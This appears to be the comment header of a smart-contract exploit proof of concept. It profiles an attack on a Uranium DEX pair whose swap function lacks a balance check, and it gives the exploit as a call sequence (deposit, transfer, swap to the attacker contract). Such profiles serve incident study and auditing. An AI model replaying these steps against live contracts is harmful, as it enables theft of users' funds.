...
// Profile:
// Ineteraction address: t1(wbnb), t2(busd), c0(this)
// Victim contract: v0(UraniumFactory), v1(UraniumPair)
// Dapp function: DEX
// Attack vector: Initialize t1, t1.deposit(1 ether), t1.transfer(v1, 1 ether), v1.swap(0, 1 ether, c0, '')
// Callback method: NaN
// Validation assertion: t1.balanceOf(c0)
// Root cause: The swap function lacks the balance check, allowing the attacker to withdraw more than the balance.